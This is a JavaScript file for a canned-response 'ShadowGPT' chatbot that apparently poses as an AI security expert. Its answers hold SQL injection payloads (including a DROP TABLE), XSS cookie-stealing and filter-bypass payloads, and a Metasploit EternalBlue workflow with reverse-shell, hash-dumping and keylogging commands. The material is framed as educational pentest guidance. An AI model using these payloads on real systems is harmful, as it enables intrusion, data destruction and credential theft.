// Enhanced ShadowGPT with Cybersecurity Intelligence
class ShadowGPT {
    constructor() {
        this.conversationHistory = [];
        this.expertMode = true;
        this.cyberKnowledge = this.initializeCyberKnowledge();
        this.init();
    }

    initializeCyberKnowledge() {
        return {
            tools: {
                'nmap': {
                    description: 'Network discovery and security auditing',
                    commands: {
                        'basic_scan': 'nmap -sS target.com',
                        'version_detection': 'nmap -sV target.com',
                        'os_detection': 'nmap -O target.com',
                        'stealth_scan': 'nmap -sS -T4 -A -v target.com',
                        'full_scan': 'nmap -p 1-65535 -T4 -A -v target.com'
                    },
                    tips: [
                        'Use -sS for SYN scan (stealthier)',
                        'Use -A for OS and version detection',
                        'Use -T4 for faster scanning',
                        'Always get proper authorization before scanning'
                    ]
                },
                'metasploit': {
                    description: 'Penetration testing framework',
                    commands: {
                        'start': 'msfconsole',
                        'search_sploit': 'search exploit_name',
                        'use_exploit': 'use exploit/path',
                        'set_options': 'set RHOSTS target.com',
                        'exploit': 'exploit'
                    }
                },
                'burp suite': {
                    description: 'Web application security testing',
                    usage: 'Configure browser proxy to 127.0.0.1:8080',
                    features: ['Intercepting proxy', 'Scanner', 'Intruder', 'Repeater']
                }
            },
            techniques: {
                'sql injection': {
                    description: 'Injecting malicious SQL queries',
                    types: ['Union-based', 'Error-based', 'Boolean-based', 'Time-based'],
                    prevention: ['Parameterized queries', 'Input validation', 'WAF'],
                    payloads: [
                        "' OR '1'='1",
                        "' UNION SELECT 1,2,3--",
                        "' AND SLEEP(5)--"
                    ]
                },
                'xss': {
                    description: 'Cross-site scripting attacks',
                    types: ['Reflected', 'Stored', 'DOM-based'],
                    payloads: [
                        '<script>alert("XSS")</script>',
                        '<img src=x onerror=alert(1)>',
                        'javascript:alert(document.cookie)'
                    ]
                }
            },
            vulnerabilities: {
                'OWASP Top 10': [
                    'Broken Access Control',
                    'Cryptographic Failures',
                    'Injection',
                    'Insecure Design',
                    'Security Misconfiguration',
                    'Vulnerable Components',
                    'Authentication Failures',
                    'Software Integrity Failures',
                    'Security Logging Failures',
                    'Server-Side Request Forgery'
                ]
            }
        };
    }

    init() {
        console.log('ShadowGPT Enhanced initialized');
        this.loadConversationHistory();
    }

    async sendMessage(userMessage) {
        this.addToHistory('user', userMessage);
        
        // Show typing indicator
        this.showTypingIndicator();
        
        // Generate intelligent response
        const response = await this.generateResponse(userMessage);
        
        // Remove typing indicator and add response
        this.removeTypingIndicator();
        this.addToHistory('assistant', response);
        
        this.saveConversationHistory();
        return response;
    }

    async generateResponse(userMessage) {
        // Simulate AI processing time
        await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 1000));

        const lowerMessage = userMessage.toLowerCase();

        // Cybersecurity tool queries
        if (lowerMessage.includes('nmap')) {
            return this.handleNmapQuery(userMessage);
        }
        if (lowerMessage.includes('sql') || lowerMessage.includes('injection')) {
            return this.handleSQLInjectionQuery(userMessage);
        }
        if (lowerMessage.includes('xss')) {
            return this.handleXSSQuery(userMessage);
        }
        if (lowerMessage.includes('metasploit') || lowerMessage.includes('msf')) {
            return this.handleMetasploitQuery(userMessage);
        }
        if (lowerMessage.includes('burp')) {
            return this.handleBurpQuery(userMessage);
        }
        if (lowerMessage.includes('exploit') || lowerMessage.includes('vulnerability')) {
            return this.handleExploitQuery(userMessage);
        }
        if (lowerMessage.includes('how to') || lowerMessage.includes('tutorial')) {
            return this.handleTutorialQuery(userMessage);
        }

        // General conversation
        return this.handleGeneralQuery(userMessage);
    }

    handleNmapQuery(message) {
        const responses = [
            `# Nmap Network Scanner Guide

## Essential Commands:
\`\`\`bash
# Basic SYN Scan
nmap -sS target.com

# Version Detection
nmap -sV target.com

# OS Detection
nmap -O target.com

# Stealth Scan with Timing
nmap -sS -T4 -A -v target.com

# Full Port Scan
nmap -p 1-65535 -T4 -A -v target.com
\`\`\`

## Pro Tips:
• Use \`-sS\` for SYN scans (stealthier than TCP connect)
• \`-A\` enables OS detection, version detection, script scanning, and traceroute
• \`-T4\` for aggressive timing (be careful with fragile systems)
• Always scan responsibly with proper authorization!`,

            `# Advanced Nmap Techniques

## Network Discovery:
\`\`\`bash
# Scan entire subnet
nmap -sP 192.168.1.0/24

# Detect firewall rules
nmap -sA target.com

# UDP port scanning
nmap -sU target.com

# Service version detection
nmap -sV --version-intensity 5 target.com
\`\`\`

## NSE Scripts:
\`\`\`bash
# Vulnerability scanning
nmap --script vuln target.com

# Safe scripts only
nmap --script safe target.com

# Specific script category
nmap --script discovery target.com
\`\`\``
        ];

        return responses[Math.floor(Math.random() * responses.length)];
    }

    handleSQLInjectionQuery(message) {
        return `# SQL Injection Master Guide

## Types of SQL Injection:
1. **Union-based** - Use UNION to extract data
2. **Error-based** - Extract data from error messages  
3. **Boolean-based** - Infer data from true/false responses
4. **Time-based** - Use timing delays to extract data

## Example Payloads:
\`\`\`sql
' OR '1'='1
' UNION SELECT 1,2,3--
' AND (SELECT SUBSTRING(password,1,1) FROM users)='a
'; DROP TABLE users--
\`\`\`

## Prevention Methods:
• Use parameterized queries (prepared statements)
• Implement proper input validation
• Use Web Application Firewalls (WAF)
• Apply the principle of least privilege
• Regular security testing

## Testing Tools:
• SQLmap (automated testing)
• Burp Suite (manual testing)
• Custom scripts

Would you like me to explain any specific technique in more detail?`;
    }

    handleXSSQuery(message) {
        return `# XSS (Cross-Site Scripting) Complete Guide

## XSS Types:
🔓 **Reflected XSS** - Payload reflected in immediate response
💾 **Stored XSS** - Payload stored on server (more dangerous)
🌐 **DOM-based XSS** - Client-side script execution

## Common Payloads:
\`\`\`html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(document.cookie)
<body onload=alert(1)>
\`\`\`

## Advanced Payloads:
\`\`\`html
<!-- Bypass basic filters -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<IMG SRC=javascript:alert('XSS')>

<!-- Using events -->
<input onfocus=alert(1) autofocus>
<video src=x onerror=alert(1)>
\`\`\`

## Prevention:
• Input validation and sanitization
• Content Security Policy (CSP)
• HTTPOnly cookies
• Output encoding
• Regular security audits`;
    }

    handleMetasploitQuery(message) {
        return `# Metasploit Framework Guide

## Basic Workflow:
\`\`\`bash
# Start Metasploit
msfconsole

# Search for exploits
search eternalblue
search type:exploit platform:windows

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set target
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST your_ip

# Exploit
exploit
\`\`\`

## Meterpreter Essentials:
\`\`\`bash
# Once you have a session:
sysinfo              # System information
getuid               # Current user
hashdump             # Dump password hashes
screenshot           # Take screenshot
keyscan_start        # Start keylogging
shell                # Get system shell
\`\`\`

## Important Notes:
• Always have proper authorization
• Use in controlled environments
• Understand the impact before running exploits
• Consider using Metasploit for defensive purposes too`;
    }

    handleBurpQuery(message) {
        return `# Burp Suite Professional Guide

## Setup Configuration:
1. **Proxy Setup**: Configure browser to use 127.0.0.1:8080
2. **Install CA Certificate**: burp -> Proxy -> Options -> Import/Export CA Certificate
3. **Intercept**: Turn intercept on/off as needed

## Key Tools:

### 🔍 **Scanner**
- Automated vulnerability scanning
- Configurable scan types
- Detailed reporting

### 🎯 **Intruder**
- Parameter fuzzing and brute force
- Custom payload sets
- Attack configurations (Sniper, Battering ram, etc.)

### 🔄 **Repeater**
- Manual request manipulation
- Compare responses
- Test payloads

### 🔬 **Decoder**
- Encode/decode data
- Multiple formats (Base64, URL, HTML, etc.)

### 📊 **Comparer**
- Compare responses
- Find differences in content

## Pro Tips:
• Use "Send to Intruder" for parameter testing
• Enable "Passive Scanner" for continuous monitoring
• Use extensions for enhanced functionality
• Always test in authorized environments only`;
    }

    handleExploitQuery(message) {
        return `# Vulnerability Exploitation Framework

## Exploitation Process:
1. **Reconnaissance** - Gather information about target
2. **Vulnerability Identification** - Find potential weaknesses  
3. **Exploit Development** - Create or modify exploits
4. **Gaining Access** - Execute the exploit
5. **Post-Exploitation** - Maintain access and gather data
6. **Covering Tracks** - Remove evidence of intrusion

## Common Vulnerability Classes:
• **Buffer Overflows** - Memory corruption attacks
• **SQL Injection** - Database manipulation
• **XSS** - Client-side script execution
• **CSRF** - Cross-site request forgery
• **File Inclusion** - Local/remote file inclusion
• **XXE** - XML external entity attacks

## Essential Tools:
\`\`\`
Exploit Databases: Exploit-DB, Packet Storm
Frameworks: Metasploit, Canvas, Core Impact
Scanners: Nessus, OpenVAS, Nexpose
Custom Tools: Python, PowerShell scripts
\`\`\`

## Ethical Considerations:
⚠️ **ALWAYS** have proper authorization
⚠️ Follow responsible disclosure practices
⚠️ Consider the impact on systems and users
⚠️ Use knowledge for defensive security`;

    }

    handleTutorialQuery(message) {
        const tutorials = {
            'penetration testing': `# Penetration Testing Methodology

## 1. Planning & Reconnaissance
• Define scope and rules of engagement
• Gather intelligence (OSINT)
• Network scanning and enumeration

## 2. Scanning & Enumeration
• Port scanning (nmap)
• Service enumeration
• Vulnerability scanning

## 3. Gaining Access
• Exploit vulnerabilities
• Social engineering
• Physical security testing

## 4. Maintaining Access
• Persistence mechanisms
• Backdoors and rootkits
• Privilege escalation

## 5. Analysis & Reporting
• Document findings
• Risk assessment
• Remediation recommendations`,

            'web application testing': `# Web Application Penetration Testing

## Testing Checklist:

### 1. Information Gathering
• Spidering and directory brute-forcing
• Technology stack identification
• API endpoint discovery

### 2. Configuration Management
• Default credentials testing
• HTTP methods testing
• Security header analysis

### 3. Identity Management
• Authentication bypass testing
• Session management testing
• Password policy assessment

### 4. Authorization Testing
• Privilege escalation testing
• Directory traversal
• Access control testing

### 5. Client-side Testing
• XSS testing
• CSRF testing
• Clickjacking testing`
        };

        for (const [key, tutorial] of Object.entries(tutorials)) {
            if (message.toLowerCase().includes(key)) {
                return tutorial;
            }
        }

        return `# Cybersecurity Learning Path

## Beginner Topics:
• Network fundamentals and TCP/IP
• Linux command line basics
• Basic scripting (Python/Bash)
• Introduction to vulnerabilities

## Intermediate Topics:
• Web application security
• Network penetration testing
• Cryptography basics
• Security tools mastery

## Advanced Topics:
• Exploit development
• Reverse engineering
• Malware analysis
• Red team operations

## Recommended Resources:
• TryHackMe / HackTheBox
• OWASP testing guide
• SANS security courses
• Cybersecurity certifications (CEH, OSCP, CISSP)

What specific area would you like to learn about?`;
    }

    handleGeneralQuery(message) {
        const responses = [
            "I'm ShadowGPT, your cybersecurity assistant! I can help with penetration testing, vulnerability analysis, security tools, and ethical hacking techniques. What would you like to know?",
            
            "As an AI cybersecurity expert, I specialize in ethical hacking, penetration testing, and security research. How can I assist with your security questions?",
            
            "Ready to discuss cybersecurity? I can provide guidance on tools like Nmap, Metasploit, Burp Suite, or explain vulnerabilities like SQL injection and XSS. What's on your mind?",
            
            "Cybersecurity professional here! I can help you understand security concepts, tool usage, or provide tutorials. What would you like to explore today?"
        ];

        // Check for greetings
        if (/(hello|hi|hey|greetings)/i.test(message)) {
            return "Hello! I'm ShadowGPT, your cybersecurity expert. Ready to discuss penetration testing, security tools, or ethical hacking?";
        }

        // Check for how are you
        if (/(how are you|how's it going)/i.test(message)) {
            return "I'm functioning optimally and ready to assist with cybersecurity topics! Currently monitoring multiple security vectors. How can I help you today?";
        }

        return responses[Math.floor(Math.random() * responses.length)];
    }

    addToHistory(role, content) {
        this.conversationHistory.push({
            role,
            content,
            timestamp: new Date().toISOString()
        });

        // Keep only last 50 messages to prevent memory issues
        if (this.conversationHistory.length > 50) {
            this.conversationHistory = this.conversationHistory.slice(-50);
        }
    }

    showTypingIndicator() {
        // This would be implemented in the UI
        console.log('ShadowGPT is typing...');
    }

    removeTypingIndicator() {
        // This would be implemented in the UI
        console.log('ShadowGPT finished typing');
    }

    saveConversationHistory() {
        try {
            localStorage.setItem('shadowgpt_conversation', JSON.stringify(this.conversationHistory));
        } catch (e) {
            console.log('Could not save conversation history');
        }
    }

    loadConversationHistory() {
        try {
            const saved = localStorage.getItem('shadowgpt_conversation');
            if (saved) {
                this.conversationHistory = JSON.parse(saved);
            }
        } catch (e) {
            console.log('Could not load conversation history');
        }
    }

    clearConversation() {
        this.conversationHistory = [];
        this.saveConversationHistory();
    }

    // Advanced cybersecurity analysis
    analyzeSecurityQuery(query) {
        const keywords = {
            'nmap': 'network scanning',
            'metasploit': 'exploitation framework', 
            'burp': 'web application testing',
            'sql': 'database security',
            'xss': 'client-side attacks',
            'firewall': 'network defense',
            'encryption': 'cryptography',
            'malware': 'threat analysis'
        };

        const detectedTopics = [];
        for (const [key, topic] of Object.entries(keywords)) {
            if (query.toLowerCase().includes(key)) {
                detectedTopics.push(topic);
            }
        }

        return detectedTopics;
    }
}

// Make it globally available
window.ShadowGPT = ShadowGPT;
